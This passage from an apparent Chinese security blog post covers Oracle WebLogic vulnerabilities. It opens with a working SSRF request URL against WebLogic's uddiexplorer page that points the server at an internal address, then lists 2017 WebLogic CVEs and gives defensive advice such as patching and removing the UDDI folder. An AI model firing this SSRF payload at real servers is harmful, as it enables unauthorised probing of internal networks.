<p><a href="http://10.158.244.198:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.158.242.100:8080&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%87%BA%E5%8F%91ssrf%E6%BC%8F%E6%B4%9E">http://10.158.244.198:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.158.242.100:8080&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search，即可出发ssrf漏洞</a></p>
<h2 id="3-WebLogic漏洞统计"><a href="#3-WebLogic漏洞统计" class="headerlink" title="3    WebLogic漏洞统计"></a>3    WebLogic漏洞统计</h2><p>对WebLogic爆发的通用型漏洞统计如下：  </p>
<table>
<thead>
<tr>
<th align="center">cve名称</th>
<th align="center">影响版本</th>
<th align="center">漏洞危害</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10178.html">CVE-2017-10178</a></td>
<td align="center">10.3.6.0,12.1.3.0,  12.2.1.1 ，12.2.1.2.</td>
<td align="center">Unauthenticated attacker with network  access via HTTP to compromise Oracle WebLogic Server</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10148.html">CVE-2017-10148</a></td>
<td align="center">10.3.6.0,  12.1.3.0, 12.2.1.1 and 12.2.1.2</td>
<td align="center">allows unauthenticated attacker with  network access via T3 to compromise Oracle WebLogic Server</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10147.html">CVE-2017-10147</a></td>
<td align="center">10.3.6.0,  12.1.3.0, 12.2.1.1 and 12.2.1.2</td>
<td align="center">allows unauthenticated attacker with  network access via T3 to compromise Oracle WebLogic Server</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10137.html">CVE-2017-10137</a></td>
<td align="center">10.3.6.0  and 12.1.3.0</td>
<td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Server</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10123.html">CVE-2017-10123</a></td>
<td align="center">12.1.3.0</td>
<td align="center">allows low privileged attacker with  network access via HTTP to compromise Oracle WebLogic Server.</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10063.html">CVE-2017-10063</a></td>
<td align="center">10.3.6.0,  12.1.3.0, 12.2.1.1 and 12.2.1.2</td>
<td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Serve</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-3531.html">CVE-2017-3531</a></td>
<td align="center">12.1.3.0,  12.2.1.0, 12.2.1.1 and 12.2.1.2</td>
<td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Server</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-3506.html">CVE-2017-3506</a></td>
<td align="center">10.3.6.0,  12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2</td>
<td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Server</td>
</tr>
<tr>
<td align="center"><a href="http://cve.scap.org.cn/CVE-2017-3248.html">CVE-2017-3248</a></td>
<td align="center">10.3.6.0,  12.1.3.0, 12.2.1.0 and 12.2.1.1</td>
<td align="center">allows unauthenticated attacker with  network access via T3 to compromise Oracle WebLogic Server.</td>
</tr>
</tbody></table>
<h2 id="4-如何防范WebLogic漏洞"><a href="#4-如何防范WebLogic漏洞" class="headerlink" title="4    如何防范WebLogic漏洞"></a>4    如何防范WebLogic漏洞</h2><p>由于WebLogic承载着系统应用的发布，所以其重要性也是不可估量，那么我们该怎么去面对WebLogic的漏洞，来保障系统的安全，可采用如下措施：</p>
<p>Ø 经常关注weblogi的安全情况，对其爆发的最新漏洞进行及时升级或打补丁；</p>
<p>Ø 尽量关闭WebLogic在公网上的开放，仅限于在内网进行维护、管理；</p>
<p>Ø 修改WebLogic的默认端口7001以及后台的默认访问路径；</p>
<p>Ø 定期对服务器进行巡检，查看是否有文件被恶意修改；</p>
<p>Ø 部署waf等安全措施，可以在一定程度上减轻该漏洞的危害；</p>
<p>Ø 如果业务不需要UDDI功能，就关闭这个功能可以删除uddiexporer文件夹；</p>
]]></content>
  </entry>
</search>
